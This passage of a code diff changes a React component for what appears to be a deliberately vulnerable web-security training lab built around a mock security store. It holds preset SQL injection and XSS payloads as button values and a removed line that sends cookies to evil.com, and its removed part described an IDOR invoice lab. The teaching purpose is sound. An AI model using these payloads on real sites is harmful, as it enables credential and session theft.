                               <td className="py-1 text-cyan-300">{row.user}</td>
                               <td className="py-1 text-amber-300">{row.role}</td>
-                              <td className="py-1 text-muted-foreground">{row.pass_hash}</td>
+                              <td className="py-1 text-slate-400">{row.pass_hash}</td>
                               <td className="py-1 text-red-300">{row.secret}</td>
                             </tr>
                           ))}
@@ -1185,85 +1269,206 @@ export function WebLabTab({
             {/* ═══════════════════════════════════════════════════════════════
                 PAGE ROUTER: Realistic Multi-Page View
             ════════════════════════════════════════════════════════════════ */}
-            <div className="min-h-[520px] max-h-[720px] overflow-y-auto bg-background/95 p-5">
+            <div className="min-h-[520px] max-h-[700px] overflow-y-auto bg-[#0a0f1d] p-5">
               {navigating ? (
                 <div className="flex flex-col items-center justify-center py-28 gap-3">
                   <span className="size-8 animate-spin rounded-full border-3 border-cyan-400/30 border-t-cyan-400" />
-                  <p className="text-xs text-muted-foreground font-mono">Loading resource from Apex server...</p>
+                  <p className="text-xs text-slate-400 font-mono">Loading resource from Apex server...</p>
                 </div>
               ) : (
                 <>
                   {/* ─────────────────────────────────────────────────────────────
-                      PAGE 1: STORE / PRODUCT CATALOG
+                      PAGE 1: INITIAL CLEAN PUBLIC HOME PAGE
                   ────────────────────────────────────────────────────────────── */}
-                  {currentPage === "store" && (
+                  {currentPage === "home" && (
                     <div className="space-y-6">
-                      {/* Hero Banner */}
-                      <div className="relative overflow-hidden rounded-2xl bg-gradient-to-br from-cyan-900/60 via-blue-900/40 to-violet-950/60 p-6 border border-cyan-500/30 shadow-lg text-white">
-                        <div className="relative z-10 max-w-lg">
-                          <span className="inline-flex items-center gap-1.5 rounded-full bg-cyan-500/20 px-2.5 py-0.5 text-[10px] font-bold text-cyan-300 border border-cyan-500/30 mb-2">
-                            🛡️ Next-Gen Zero Trust Hardware & SOC
-                          </span>
-                          <h1 className="text-2xl font-black tracking-tight">Enterprise Defense Store</h1>
-                          <p className="mt-1.5 text-xs text-white/80 leading-relaxed">
-                            Discover battle-tested security appliances, hardware tokens, and cloud defensive tools
-                            protected by real-time WebGuard WAF inspection.
+                      {/* Hero Section */}
+                      <div className="relative overflow-hidden rounded-3xl bg-gradient-to-br from-[#0e2238] via-[#101b33] to-[#16122d] p-7 border border-cyan-500/30 shadow-2xl">
+                        <div className="relative z-10 max-w-lg space-y-3">
+                          <div className="inline-flex items-center gap-1.5 rounded-full bg-cyan-500/20 px-3 py-1 text-[10px] font-bold text-cyan-300 border border-cyan-500/40">
+                            🛡️ Next-Gen Zero-Trust Architecture & Threat Shield
+                          </div>
+                          <h1 className="text-2xl md:text-3xl font-black tracking-tight text-white">
+                            Apex Cloud & Security Platform
+                          </h1>
+                          <p className="text-xs text-slate-300 leading-relaxed">
+                            Protecting mission-critical cloud infrastructure with military-grade hardware authenticators,
+                            edge firewalls, and AI-driven SOC telemetry.
                           </p>
-                          <div className="mt-4 flex flex-wrap gap-2">
+
+                          <div className="pt-2 flex flex-wrap gap-2.5">
                             <Button
                               size="sm"
-                              onClick={() => {
-                                setSelectedProduct(PRODUCTS[0]);
-                                navigateTo("product");
-                              }}
-                              className="h-8 gap-1.5 text-xs font-bold rounded-xl bg-cyan-500 text-black hover:bg-cyan-400"
+                              onClick={() => navigateTo("products")}
+                              className="h-9 gap-1.5 text-xs font-bold rounded-xl bg-cyan-500 text-black hover:bg-cyan-400 shadow-lg"
                             >
-                              Explore Flagship Titan Key →
+                              Explore Product Catalog →
                             </Button>
-                            <Button
-                              size="sm"
-                              variant="outline"
-                              onClick={() => navigateTo("tools")}
-                              className="h-8 gap-1.5 text-xs font-bold rounded-xl border-white/30 text-white hover:bg-white/10"
-                            >
-                              <Wrench className="size-3.5" /> Diagnostics Lab
-                            </Button>
+                            {!currentUser ? (
+                              <Button
+                                size="sm"
+                                variant="outline"
+                                onClick={() => navigateTo("login")}
+                                className="h-9 gap-1.5 text-xs font-bold rounded-xl border-slate-700 bg-slate-900/80 text-white hover:bg-slate-800"
+                              >
+                                <Key className="size-3.5 text-cyan-400" /> Sign In to Portal
+                              </Button>
+                            ) : (
+                              <Button
+                                size="sm"
+                                variant="outline"
+                                onClick={() => navigateTo("dashboard")}
+                                className="h-9 gap-1.5 text-xs font-bold rounded-xl border-cyan-500/40 text-cyan-300 hover:bg-cyan-500/10"
+                              >
+                                <LayoutDashboard className="size-3.5" /> Open My Dashboard
+                              </Button>
+                            )}
                           </div>
                         </div>
-                        <div className="absolute -right-8 -top-8 size-48 rounded-full bg-cyan-500/10 blur-2xl" />
+                        <div className="absolute -right-6 -top-6 size-48 rounded-full bg-cyan-500/10 blur-3xl pointer-events-none" />
                       </div>
 
-                      {/* Search Bar & Category Filters */}
-                      <div className="flex flex-col gap-3">
+                      {/* Stats Overview */}
+                      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
+                        {[
+                          { label: "Hardware Keys Active", value: "248,000+", icon: <Key className="size-4 text-cyan-400" /> },
+                          { label: "Uptime SLA", value: "99.999%", icon: <TrendingUp className="size-4 text-emerald-400" /> },
+                          { label: "Threats Blocked", value: "1.4M / day", icon: <Shield className="size-4 text-amber-400" /> },
+                          { label: "Enterprise Customers", value: "4,200+", icon: <Users className="size-4 text-violet-400" /> },
+                        ].map((stat, idx) => (
+                          <div key={idx} className="rounded-2xl border border-slate-800 bg-[#0d1424] p-3.5 space-y-1">
+                            <div className="flex items-center justify-between">
+                              <span className="text-[10px] text-slate-400 font-medium">{stat.label}</span>
+                              {stat.icon}
+                            </div>
+                            <p className="font-mono font-bold text-base text-white">{stat.value}</p>
+                          </div>
+                        ))}
+                      </div>
+
+                      {/* Featured Products Teaser */}
+                      <div className="space-y-3">
+                        <div className="flex items-center justify-between">
+                          <h3 className="text-sm font-bold text-white flex items-center gap-2">
+                            <Package className="size-4 text-cyan-400" /> Featured Hardware & Cloud Appliances
+                          </h3>
+                          <button
+                            type="button"
+                            onClick={() => navigateTo("products")}
+                            className="text-xs text-cyan-400 hover:underline font-semibold"
+                          >
+                            View all 6 items →
+                          </button>
+                        </div>
+
+                        <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
+                          {PRODUCTS.slice(0, 3).map((p) => (
+                            <div
+                              key={p.id}
+                              className="rounded-2xl border border-slate-800 bg-[#0d1424] p-4 flex flex-col justify-between hover:border-cyan-500/40 transition group"
+                            >
+                              <div>
+                                <div className="flex items-center justify-between">
+                                  <span className="text-3xl p-2 rounded-xl bg-slate-800/80">{p.icon}</span>
+                                  {p.badge && (
+                                    <span className="rounded-full bg-cyan-500/15 border border-cyan-500/30 px-2 py-0.5 text-[8px] font-bold text-cyan-300">
+                                      {p.badge}
+                                    </span>
+                                  )}
+                                </div>
+                                <h4 className="mt-3 text-xs font-bold text-white group-hover:text-cyan-300 transition">
+                                  {p.name}
+                                </h4>
+                                <p className="mt-1 text-[10px] text-slate-400 line-clamp-2">{p.description}</p>
+                              </div>
+                              <div className="mt-3 pt-2.5 border-t border-slate-800 flex items-center justify-between">
+                                <span className="font-mono font-extrabold text-sm text-cyan-400">
+                                  ${p.price.toFixed(2)}
+                                </span>
+                                <Button
+                                  size="sm"
+                                  variant="ghost"
+                                  onClick={() => {
+                                    setSelectedProduct(p);
+                                    navigateTo("product-detail");
+                                  }}
+                                  className="h-7 text-xs font-semibold text-slate-300 hover:text-white"
+                                >
+                                  Details →
+                                </Button>
+                              </div>
+                            </div>
+                          ))}
+                        </div>
+                      </div>
+
+                      {/* Call-to-action to Sign In */}
+                      {!currentUser && (
+                        <div className="rounded-2xl border border-cyan-500/30 bg-gradient-to-r from-cyan-950/40 to-blue-950/40 p-4 flex items-center justify-between">
+                          <div className="flex items-center gap-3">
+                            <span className="text-2xl">🔐</span>
+                            <div>
+                              <p className="text-xs font-bold text-white">Sign In to Test Enterprise Features</p>
+                              <p className="text-[10px] text-slate-400">
+                                Unlocks Customer Orders, System Diagnostics Console, and Secret Executive Admin Portal.
+                              </p>
+                            </div>
+                          </div>
+                          <Button
+                            size="sm"
+                            onClick={() => navigateTo("login")}
+                            className="h-8 text-xs font-bold bg-cyan-500 text-black hover:bg-cyan-400 rounded-xl"
+                          >
+                            Sign In Now
+                          </Button>
+                        </div>
+                      )}
+                    </div>
+                  )}
+
+                  {/* ─────────────────────────────────────────────────────────────
+                      PAGE 2: FULL PRODUCT CATALOG (SEARCH VULNERABLE TO SQLI/XSS)
+                  ────────────────────────────────────────────────────────────── */}
+                  {currentPage === "products" && (
+                    <div className="space-y-6">
+                      <div>
+                        <h2 className="text-lg font-bold text-white flex items-center gap-2">
+                          <Package className="size-5 text-cyan-400" /> Product & Appliance Catalog
+                        </h2>
+                        <p className="text-xs text-slate-400 mt-0.5">
+                          Browse all certified security authenticators and managed defense platforms.
+                        </p>
+                      </div>
+
+                      {/* Search Bar & Category Filter */}
+                      <div className="space-y-3">
                         <div className="flex flex-wrap gap-2 items-center justify-between">
-                          {/* Search Input (Vulnerable to Reflected XSS & SQLi) */}
-                          <div className="relative flex-1 min-w-[260px]">
-                            <Search className="absolute left-3 top-1/2 size-4 -translate-y-1/2 text-muted-foreground" />
+                          <div className="relative flex-1 min-w-[240px]">
+                            <Search className="absolute left-3 top-1/2 size-4 -translate-y-1/2 text-slate-400" />
                             <Input
                               value={searchQuery}
                               onChange={(e) => handleStoreSearch(e.target.value)}
-                              placeholder="Search products by keyword (e.g. 'Titan' or try attack payload)..."
-                              className="h-9 pl-9 pr-20 font-mono text-xs border-border/60 bg-muted/30 focus-visible:ring-cyan-400"
+                              placeholder="Search products by keyword or test exploit payload..."
+                              className="h-9 pl-9 pr-8 font-mono text-xs border-slate-700 bg-[#070b14] text-white focus-visible:ring-cyan-400"
                             />
                             {searchQuery && (
                               <button
                                 type="button"
                                 onClick={() => handleStoreSearch("")}
-                                className="absolute right-2.5 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
+                                className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white"
                               >
                                 <X className="size-3.5" />
                               </button>
                             )}
                           </div>
 
-                          {/* Category Filter Pills */}
                           <div className="flex items-center gap-1.5 overflow-x-auto">
                             {[
                               { id: "all", label: "All Items" },
-                              { id: "tokens", label: "Hardware Tokens" },
-                              { id: "hardware", label: "Appliances" },
-                              { id: "cloud", label: "Cloud Services" },
-                              { id: "software", label: "DevSecOps" },
+                              { id: "tokens", label: "Tokens" },
+                              { id: "hardware", label: "Hardware" },
+                              { id: "cloud", label: "Cloud" },
+                              { id: "software", label: "Software" },
                             ].map((cat) => (
                               <button
                                 key={cat.id}
@@ -1272,8 +1477,8 @@ export function WebLabTab({
                                 className={cn(
                                   "rounded-lg px-2.5 py-1 text-[11px] font-semibold transition",
                                   selectedCategory === cat.id
-                                    ? "bg-cyan-500 text-black shadow-sm"
-                                    : "bg-muted/40 text-muted-foreground hover:text-foreground hover:bg-muted"
+                                    ? "bg-cyan-500 text-black shadow-sm font-bold"
+                                    : "bg-slate-800/80 text-slate-300 hover:text-white hover:bg-slate-700"
                                 )}
                               >
                                 {cat.label}
@@ -1282,22 +1487,21 @@ export function WebLabTab({
                           </div>
                         </div>
 
-                        {/* Quick Attack Injector for Search */}
-                        <div className="rounded-xl border border-red-500/25 bg-red-500/[0.04] p-2.5 flex flex-wrap items-center gap-2">
+                        {/* Quick Exploit Bar for Search */}
+                        <div className="rounded-xl border border-red-500/30 bg-red-950/20 p-2.5 flex flex-wrap items-center gap-2">
                           <span className="text-[10px] font-bold uppercase tracking-wider text-red-400 flex items-center gap-1">
-                            <Flame className="size-3.5" /> Quick Search Attacks:
+                            <Flame className="size-3.5" /> Test Search Attacks:
                           </span>
                           {[
-                            { label: "SQLi Union Dump", payload: "' UNION SELECT 1,username,password_hash,api_key FROM users--" },
-                            { label: "Reflected XSS", payload: "<script>alert('XSS on ' + document.domain)</script>" },
-                            { label: "SVG Onload XSS", payload: "<svg/onload=alert('XSS_Vector_1')>" },
+                            { label: "SQLi Union Table Dump", payload: "' UNION SELECT 1,username,password_hash,api_key FROM users--" },
+                            { label: "Reflected XSS", payload: "<script>alert('XSS reflected on ' + document.domain)</script>" },
                             { label: "Boolean SQLi", payload: "' OR 1=1--" },
                           ].map((atk) => (
                             <button
                               key={atk.label}
                               type="button"
                               onClick={() => handleStoreSearch(atk.payload)}
-                              className="rounded-md border border-red-500/30 bg-red-500/10 px-2 py-0.5 text-[10px] font-mono text-red-300 hover:bg-red-500/20 transition"
+                              className="rounded-md border border-red-500/40 bg-red-500/10 px-2 py-0.5 text-[9px] font-mono text-red-300 hover:bg-red-500/20 transition"
                             >
                               {atk.label}
                             </button>
@@ -1306,52 +1510,47 @@ export function WebLabTab({
                       </div>
 
                       {/* Product Grid */}
-                      <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 md:grid-cols-3">
+                      <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
                         {filteredProducts.map((p) => (
                           <div
                             key={p.id}
-                            className="group flex flex-col justify-between rounded-2xl border border-border/50 bg-card/60 p-4 transition-all hover:border-cyan-500/40 hover:shadow-lg hover:shadow-cyan-500/5"
+                            className="flex flex-col justify-between rounded-2xl border border-slate-800 bg-[#0d1424] p-4 hover:border-cyan-500/40 transition group shadow-md"
                           >
                             <div>
-                              <div className="flex items-start justify-between gap-2">
-                                <span className="text-3xl p-2 rounded-xl bg-muted/50">{p.icon}</span>
+                              <div className="flex items-start justify-between">
+                                <span className="text-3xl p-2.5 rounded-xl bg-slate-800/80">{p.icon}</span>
                                 {p.badge && (
-                                  <span className="rounded-full bg-cyan-500/15 border border-cyan-500/30 px-2 py-0.5 text-[9px] font-bold text-cyan-300">
+                                  <span className="rounded-full bg-cyan-500/15 border border-cyan-500/30 px-2 py-0.5 text-[8px] font-bold text-cyan-300">
                                     {p.badge}
                                   </span>
                                 )}
                               </div>
-
-                              <h3 className="mt-3 font-bold text-sm text-foreground group-hover:text-cyan-400 transition">
+                              <h3 className="mt-3 text-xs font-bold text-white group-hover:text-cyan-300 transition">
                                 {p.name}
                               </h3>
-                              <p className="mt-1 text-[11px] text-muted-foreground line-clamp-2 leading-relaxed">
+                              <p className="mt-1 text-[10px] text-slate-400 line-clamp-2 leading-relaxed">
                                 {p.description}
                               </p>
-
-                              <div className="mt-3 flex items-center gap-1.5 text-[10px] text-amber-400">
+                              <div className="mt-3 flex items-center gap-1 text-[10px] text-amber-400">
                                 <Star className="size-3 fill-amber-400" />
-                                <span className="font-bold text-foreground">{p.rating}</span>
-                                <span className="text-muted-foreground">({p.reviewsCount} reviews)</span>
+                                <span className="font-bold text-white">{p.rating}</span>
+                                <span className="text-slate-400">({p.reviewsCount} reviews)</span>
                               </div>
                             </div>
 
-                            <div className="mt-4 pt-3 border-t border-border/40 flex items-center justify-between">
-                              <div>
-                                <span className="text-[10px] text-muted-foreground">Price</span>
-                                <p className="font-mono font-extrabold text-base text-foreground">${p.price.toFixed(2)}</p>
-                              </div>
+                            <div className="mt-4 pt-3 border-t border-slate-800 flex items-center justify-between">
+                              <p className="font-mono font-extrabold text-sm text-cyan-400">${p.price.toFixed(2)}</p>
                               <div className="flex items-center gap-1.5">
                                 <Button
                                   size="sm"
                                   variant="outline"
                                   onClick={() => {
                                     setSelectedProduct(p);
-                                    navigateTo("product");
+                                    navigateTo("product-detail");
                                   }}
-                                  className="h-8 text-xs font-semibold rounded-xl border-border/60 hover:border-cyan-500/50"
+                                  className="h-7 text-xs font-semibold rounded-lg border-slate-700 hover:border-cyan-500/50"
                                 >
-                                  Details
+                                  Specs & Reviews
                                 </Button>
                                 <Button
                                   size="sm"
@@ -1367,7 +1566,7 @@ export function WebLabTab({
                                     });
                                     toast.success(`Added ${p.name} to Cart`);
                                   }}
-                                  className="h-8 px-2.5 rounded-xl bg-cyan-500/15 text-cyan-300 hover:bg-cyan-500/30 border border-cyan-500/30"
+                                  className="h-7 px-2 rounded-lg bg-cyan-500/15 text-cyan-300 hover:bg-cyan-500/30 border border-cyan-500/30"
                                   title="Add to Cart"
                                 >
                                   <Plus className="size-3.5" />
@@ -1381,28 +1580,28 @@ export function WebLabTab({
                   )}
 
                   {/* ─────────────────────────────────────────────────────────────
-                      PAGE 2: PRODUCT DETAIL & CUSTOMER REVIEWS (STORED XSS)
+                      PAGE 3: PRODUCT DETAIL & REVIEWS (STORED XSS)
                   ────────────────────────────────────────────────────────────── */}
-                  {currentPage === "product" && selectedProduct && (
+                  {currentPage === "product-detail" && selectedProduct && (
                     <div className="space-y-6">
                       <Button
                         variant="ghost"
                         size="sm"
-                        onClick={() => navigateTo("store")}
-                        className="gap-1.5 text-xs text-muted-foreground hover:text-foreground h-8"
+                        onClick={() => navigateTo("products")}
+                        className="gap-1.5 text-xs text-slate-400 hover:text-white h-8"
                       >
                         <ArrowLeft className="size-3.5" /> Back to Catalog
                       </Button>
 
                       <div className="grid grid-cols-1 md:grid-cols-12 gap-6 items-start">
-                        {/* Product Overview */}
-                        <div className="md:col-span-5 rounded-2xl border border-border/50 bg-card/60 p-6 flex flex-col items-center text-center">
-                          <span className="text-6xl p-6 rounded-3xl bg-muted/40 shadow-inner mb-4">
+                        {/* Product Card */}
+                        <div className="md:col-span-5 rounded-2xl border border-slate-800 bg-[#0d1424] p-6 flex flex-col items-center text-center space-y-3">
+                          <span className="text-6xl p-6 rounded-3xl bg-slate-800/80 shadow-inner">
                             {selectedProduct.icon}
                           </span>
-                          <h2 className="text-lg font-bold text-foreground">{selectedProduct.name}</h2>
-                          <p className="mt-1 text-xs text-muted-foreground">{selectedProduct.description}</p>
-                          <p className="mt-4 font-mono text-2xl font-black text-cyan-400">
+                          <h2 className="text-base font-bold text-white">{selectedProduct.name}</h2>
+                          <p className="text-xs text-slate-300">{selectedProduct.description}</p>
+                          <p className="font-mono text-2xl font-black text-cyan-400">
                             ${selectedProduct.price.toFixed(2)}
                           </p>
                           <Button
@@ -1411,46 +1610,43 @@ export function WebLabTab({
                               toast.success(`Added to Cart`);
                               navigateTo("cart");
                             }}
-                            className="mt-4 w-full h-9 rounded-xl font-bold text-xs bg-cyan-500 text-black hover:bg-cyan-400 gap-2"
+                            className="w-full h-9 rounded-xl font-bold text-xs bg-cyan-500 text-black hover:bg-cyan-400 gap-2 shadow-md"
                           >
                             <ShoppingCart className="size-4" /> Add to Cart & Checkout
                           </Button>
                         </div>
 
-                        {/* Specs & Tech Details */}
+                        {/* Specs & Reviews (Stored XSS Target) */}
                         <div className="md:col-span-7 space-y-4">
-                          <div className="rounded-2xl border border-border/50 bg-card/60 p-5 space-y-3">
-                            <h3 className="text-xs font-bold uppercase tracking-wider text-muted-foreground">
-                              Technical Specifications & Security Attributes
+                          <div className="rounded-2xl border border-slate-800 bg-[#0d1424] p-5 space-y-3">
+                            <h3 className="text-xs font-bold uppercase tracking-wider text-slate-400">
+                              Technical Specifications
                             </h3>
-                            <div className="grid grid-cols-2 gap-2.5">
+                            <div className="grid grid-cols-2 gap-2">
                               {selectedProduct.specs.map((spec, i) => (
-                                <div key={i} className="flex items-center gap-2 rounded-xl bg-muted/40 p-2.5 text-xs">
+                                <div key={i} className="flex items-center gap-2 rounded-xl bg-slate-850 bg-[#070b14] p-2.5 text-xs border border-slate-800">
                                   <CheckCircle2 className="size-3.5 text-emerald-400 shrink-0" />
-                                  <span className="text-foreground/90 font-medium">{spec}</span>
+                                  <span className="text-slate-200">{spec}</span>
                                 </div>
                               ))}
                             </div>
                           </div>
 
-                          {/* Customer Reviews Section (Stored XSS Target) */}
-                          <div className="rounded-2xl border border-border/50 bg-card/60 p-5 space-y-4">
-                            <div className="flex items-center justify-between">
-                              <h3 className="text-sm font-bold text-foreground flex items-center gap-2">
-                                <MessageSquare className="size-4 text-cyan-400" />
-                                Customer Reviews ({reviews.length})
-                              </h3>
-                              <span className="text-[10px] text-muted-foreground">Community verified</span>
-                            </div>
+                          {/* Customer Reviews Box */}
+                          <div className="rounded-2xl border border-slate-800 bg-[#0d1424] p-5 space-y-4">
+                            <h3 className="text-sm font-bold text-white flex items-center gap-2">
+                              <MessageSquare className="size-4 text-cyan-400" />
+                              Customer Reviews ({reviews.length})
+                            </h3>
 
-                            {/* Write Review Box */}
-                            <div className="rounded-xl border border-border/60 bg-muted/20 p-3 space-y-3">
-                              <div className="flex flex-wrap gap-2 items-center justify-between">
+                            {/* Write Review Form */}
+                            <div className="rounded-xl border border-slate-700/80 bg-[#070b14] p-3 space-y-2.5">
+                              <div className="flex justify-between items-center">
                                 <Input
                                   value={newReviewAuthor}
                                   onChange={(e) => setNewReviewAuthor(e.target.value)}
                                   placeholder="Your Name / Handle"
-                                  className="h-8 max-w-[200px] text-xs font-mono bg-background/80"
+                                  className="h-8 max-w-[200px] text-xs font-mono bg-slate-900 border-slate-700 text-white"
                                 />
                                 <div className="flex items-center gap-1">
                                   {[1, 2, 3, 4, 5].map((star) => (
@@ -1465,7 +1661,7 @@ export function WebLabTab({
                                           "size-4",
                                           star <= newReviewRating
                                             ? "text-amber-400 fill-amber-400"
-                                            : "text-muted-foreground"
+                                            : "text-slate-600"
                                         )}
                                       />
                                     </button>
@@ -1476,19 +1672,17 @@ export function WebLabTab({
                               <Textarea
                                 value={newReviewComment}
                                 onChange={(e) => setNewReviewComment(e.target.value)}
-                                placeholder="Share your review or test Stored XSS payload (e.g. <script>alert('XSS')</script>)..."
-                                className="min-h-16 text-xs font-mono bg-background/80 resize-none"
+                                placeholder="Enter review or test Stored XSS (e.g. <script>alert('Stored XSS')</script>)..."
+                                className="min-h-16 text-xs font-mono bg-slate-900 border-slate-700 text-white resize-none"
                               />
 
-                              {/* Quick Stored XSS Attack Pills */}
-                              <div className="flex flex-wrap items-center gap-1.5 pt-1 border-t border-border/30">
+                              <div className="flex flex-wrap items-center gap-1.5 pt-1 border-t border-slate-800">
                                 <span className="text-[9px] font-bold text-red-400 uppercase tracking-wider">
-                                  Stored XSS Pills:
+                                  XSS Payloads:
                                 </span>
                                 {[
                                   "<script>alert('Stored XSS in Review')</script>",
                                   "<img src=x onerror=alert('Session Stolen!')>",
-                                  "<svg/onload=fetch('http://evil.com/?c='+document.cookie)>",
                                 ].map((payload) => (
                                   <button
                                     key={payload}
@@ -1496,13 +1690,13 @@ export function WebLabTab({
                                     onClick={() => setNewReviewComment(payload)}
                                     className="rounded border border-red-500/30 bg-red-500/10 px-1.5 py-0.5 font-mono text-[9px] text-red-300 hover:bg-red-500/20"
                                   >
-                                    {payload.slice(0, 26)}...
+                                    {payload.slice(0, 24)}...
                                   </button>
                                 ))}
                                 <Button
                                   size="sm"
                                   onClick={handleAddReview}
-                                  className="ml-auto h-7 text-xs font-bold bg-cyan-500 text-black hover:bg-cyan-400"
+                                  className="ml-auto h-7 text-xs font-bold bg-cyan-500 text-black hover:bg-cyan-400 rounded-lg"
                                 >
                                   Post Review
                                 </Button>
@@ -1510,29 +1704,29 @@ export function WebLabTab({
                             </div>
 
                             {/* Reviews Feed */}
-                            <div className="space-y-2.5 max-h-56 overflow-y-auto pr-1">
+                            <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
                               {reviews.map((rev) => (
                                 <div
                                   key={rev.id}
                                   className={cn(
                                     "rounded-xl border p-3 text-xs space-y-1 transition",
                                     rev.isExploit
-                                      ? "border-red-500/40 bg-red-500/[0.06]"
-                                      : "border-border/40 bg-muted/20"
+                                      ? "border-red-500/50 bg-red-950/40 text-red-200"
+                                      : "border-slate-800 bg-[#070b14] text-slate-200"
                                   )}
                                 >
                                   <div className="flex items-center justify-between">
-                                    <span className="font-bold text-foreground flex items-center gap-1.5">
-                                      <User className="size-3 text-muted-foreground" /> {rev.author}
+                                    <span className="font-bold flex items-center gap-1.5">
+                                      <User className="size-3 text-slate-400" /> {rev.author}
                                       {rev.isExploit && (
                                         <span className="rounded bg-red-500/20 px-1 py-0.2 text-[8px] font-bold text-red-400">
-                                          STORED XSS ACTIVE
+                                          STORED XSS
                                         </span>
                                       )}
                                     </span>
-                                    <span className="text-[10px] text-muted-foreground">{rev.date}</span>
+                                    <span className="text-[10px] text-slate-400">{rev.date}</span>
                                   </div>
-                                  <p className="text-muted-foreground font-mono text-[11px]">{rev.comment}</p>
+                                  <p className="font-mono text-[11px] text-slate-300">{rev.comment}</p>
                                 </div>
                               ))}
                             </div>
@@ -1543,178 +1737,17 @@ export function WebLabTab({
                   )}
 
                   {/* ─────────────────────────────────────────────────────────────
-                      PAGE 3: CART, CHECKOUT & ORDER LOOKUP (IDOR)
-                  ────────────────────────────────────────────────────────────── */}
-                  {currentPage === "cart" && (
-                    <div className="space-y-6">
-                      <h2 className="text-lg font-bold text-foreground flex items-center gap-2">
-                        <ShoppingCart className="size-5 text-cyan-400" />
-                        Shopping Cart & Order Tracking
-                      </h2>
-
-                      <div className="grid grid-cols-1 md:grid-cols-12 gap-6 items-start">
-                        {/* Cart Items */}
-                        <div className="md:col-span-7 space-y-4">
-                          <div className="rounded-2xl border border-border/50 bg-card/60 p-4 space-y-3">
-                            <h3 className="text-xs font-bold uppercase tracking-wider text-muted-foreground">
-                              Cart Items ({cart.length})
-                            </h3>
-                            {cart.length === 0 ? (
-                              <p className="text-xs text-muted-foreground py-6 text-center">Your cart is empty.</p>
-                            ) : (
-                              cart.map((item, idx) => (
-                                <div
-                                  key={idx}
-                                  className="flex items-center justify-between border-b border-border/30 pb-3 last:border-0 last:pb-0"
-                                >
-                                  <div className="flex items-center gap-3">
-                                    <span className="text-2xl p-2 rounded-xl bg-muted/40">{item.product.icon}</span>
-                                    <div>
-                                      <p className="text-xs font-bold text-foreground">{item.product.name}</p>
-                                      <p className="text-[10px] text-muted-foreground">
-                                        Qty: {item.quantity} · ${item.product.price.toFixed(2)} each
-                                      </p>
-                                    </div>
-                                  </div>
-                                  <div className="flex items-center gap-3">
-                                    <span className="font-mono font-bold text-sm text-cyan-400">
-                                      ${(item.product.price * item.quantity).toFixed(2)}
-                                    </span>
-                                    <button
-                                      type="button"
-                                      onClick={() => setCart((prev) => prev.filter((_, i) => i !== idx))}
-                                      className="text-muted-foreground hover:text-red-400 transition"
-                                    >
-                                      <Trash2 className="size-3.5" />
-                                    </button>
-                                  </div>
-                                </div>
-                              ))
-                            )}
-
-                            {cart.length > 0 && (
-                              <div className="pt-3 border-t border-border/40 flex justify-between items-center">
-                                <span className="text-xs font-bold text-foreground">Total Checkout Amount:</span>
-                                <span className="font-mono text-lg font-black text-foreground">
-                                  ${cartTotal.toFixed(2)}
-                                </span>
-                              </div>
-                            )}
-                          </div>
-                        </div>
-
-                        {/* Order Tracking by ID (IDOR Vulnerability Target) */}
-                        <div className="md:col-span-5 space-y-4">
-                          <div className="rounded-2xl border border-red-500/30 bg-red-500/[0.04] p-5 space-y-3">
-                            <div className="flex items-center gap-2">
-                              <span className="flex size-6 items-center justify-center rounded-lg bg-red-500/20 text-red-400 text-xs font-bold">
-                                🔓
-                              </span>
-                              <div>
-                                <h3 className="text-xs font-bold text-red-400 uppercase tracking-wider">
-                                  Track Order / Invoice (IDOR Lab)
-                                </h3>
-                                <p className="text-[10px] text-muted-foreground">
-                                  Change the Order ID below to view other customer invoices without authorization.
-                                </p>
-                              </div>
-                            </div>
-
-                            <div className="flex gap-2">
-                              <Input
-                                value={orderLookupId}
-                                onChange={(e) => setOrderLookupId(e.target.value)}
-                                placeholder="Order ID (e.g. 1002)"
-                                className="h-9 font-mono text-xs bg-background/80"
-                              />
-                              <Button
-                                size="sm"
-                                onClick={() => handleOrderLookup(orderLookupId)}
-                                className="h-9 px-4 text-xs font-bold bg-red-500/20 text-red-300 border border-red-500/30 hover:bg-red-500/30"
-                              >
-                                Lookup
-                              </Button>
-                            </div>
-
-                            {/* IDOR Test Pills */}
-                            <div className="flex flex-wrap gap-1.5">
-                              {["1001 (You)", "1002 (CFO VIP)", "1003 (Director)", "1004 (DBA)"].map((opt) => {
-                                const idOnly = opt.split(" ")[0];
-                                return (
-                                  <button
-                                    key={opt}
-                                    type="button"
-                                    onClick={() => {
-                                      setOrderLookupId(idOnly);
-                                      handleOrderLookup(idOnly);
-                                    }}
-                                    className="rounded-md border border-red-500/30 bg-red-500/10 px-2 py-0.5 text-[10px] font-mono text-red-300 hover:bg-red-500/20"
-                                  >
-                                    ID: {opt}
-                                  </button>
-                                );
-                              })}
-                            </div>
-
-                            {/* Looked Up Order Result */}
-                            {lookedUpOrder && (
-                              <div
-                                className={cn(
-                                  "rounded-xl border p-3 text-xs space-y-2 font-mono transition-all",
-                                  lookedUpOrder.isConfidential
-                                    ? "border-red-500/50 bg-red-950/40 text-red-200"
-                                    : "border-border/60 bg-muted/30 text-foreground"
-                                )}
-                              >
-                                <div className="flex justify-between items-center border-b border-border/30 pb-1.5">
-                                  <span className="font-bold">INVOICE #{lookedUpOrder.id}</span>
-                                  <span className="rounded bg-emerald-500/20 text-emerald-400 px-1.5 py-0.2 text-[9px]">
-                                    {lookedUpOrder.status}
-                                  </span>
-                                </div>
-                                <p>
-                                  <span className="text-muted-foreground">Customer:</span> {lookedUpOrder.customerName}
-                                </p>
-                                <p>
-                                  <span className="text-muted-foreground">Email:</span> {lookedUpOrder.email}
-                                </p>
-                                <p>
-                                  <span className="text-muted-foreground">Card on File:</span> ****-****-****-
-                                  {lookedUpOrder.cardLast4}
-                                </p>
-                                <p>
-                                  <span className="text-muted-foreground">Shipping:</span>{" "}
-                                  {lookedUpOrder.shippingAddress}
-                                </p>
-                                <p className="font-bold text-cyan-300">
-                                  <span className="text-muted-foreground">Total Invoiced:</span> $
-                                  {lookedUpOrder.total.toFixed(2)}
-                                </p>
-                                {lookedUpOrder.isConfidential && (
-                                  <p className="text-[10px] text-red-400 font-bold bg-red-500/20 p-1 rounded border border-red-500/30">
-                                    ⚠️ IDOR BREACH: Unauthenticated access to Executive data!
-                                  </p>
-                                )}
-                              </div>
